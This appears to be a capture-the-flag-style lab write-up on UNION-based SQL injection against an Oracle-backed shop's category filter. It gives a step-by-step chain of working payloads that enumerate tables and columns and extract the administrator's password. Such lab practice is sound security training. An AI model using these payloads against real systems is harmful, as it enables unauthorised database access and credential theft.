Title: SQL injection attack, listing the database contents on Oracle
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
To solve the lab, log in as the administrator user. 

payload: `category=Gifts' OR 1=1--`
![image](https://github.com/user-attachments/assets/4f3ad277-a39a-4b4b-ac7a-779afabe9578)

payload: `category=Gifts' OR 1=1 UNION SELECT '1','2' FROM DUAL--`
![image](https://github.com/user-attachments/assets/73cdc1c0-4ff6-450c-abda-936d4f098e85)

payload: `category=Gifts' OR 1=1 UNION SELECT table_name,'2' FROM ALL_TABLES--`
![image](https://github.com/user-attachments/assets/9cceafd8-ea39-44e4-a5d8-d2d54108cd84)

USERS_MKNPBT

payload: `category=Gifts' OR 1=1 UNION SELECT column_name,'2' FROM ALL_TAB_COLUMNS--`
![image](https://github.com/user-attachments/assets/38a84f31-ad57-4a10-a4d3-fffdb2bb618f)

PASSWORD_VTCJVE
USERNAME_YJYMYM

payload: `category=Gifts' OR 1=1 UNION SELECT PASSWORD_VTCJVE,'2' FROM USERS_MKNPBT WHERE USERNAME_YJYMYM='administrator'--`
